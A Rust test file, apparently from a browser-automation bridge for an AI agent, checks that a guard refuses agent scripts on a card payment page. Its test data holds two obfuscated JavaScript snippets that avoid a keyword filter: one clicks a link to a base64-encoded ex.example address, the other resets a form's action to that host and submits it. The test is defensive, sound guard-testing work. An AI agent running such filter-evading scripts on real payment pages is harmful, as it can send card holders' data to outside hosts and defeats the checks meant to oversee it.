//! Second review of card-guards (083b7b12f), 14/11. Never pushed. rw5: a way out of the page written without the
//! words MAKES_WAY knows (defence in depth: card_pay.rs refuses a provider's page after any script of the agent's).

use bipbridge::browser_mcp::{script_card_refusal, PROVIDER_SCRIPT_REFUSED};
use serde_json::json;

#[test]
fn rw5_a_link_made_without_the_usual_words_is_refused() {
    let empty = json!({"pw": {}, "known": [], "boxes": [], "cards": {}, "cardtext": false, "frames": 0});
    for script in [
        "const a = document.createElement(String.fromCharCode(97)); a['hr' + 'ef'] = atob('aHR0cHM6Ly9leC5leGFtcGxlLw=='); \
         document.body.append(a); a.click()",
        "const f = document.forms[0]; Reflect.set(f, 'act' + 'ion', 'https://ex.example/'); f.submit()",
    ] {
        assert_eq!(script_card_refusal(script, Some(&empty)), Some(PROVIDER_SCRIPT_REFUSED), "{script}");
    }
}
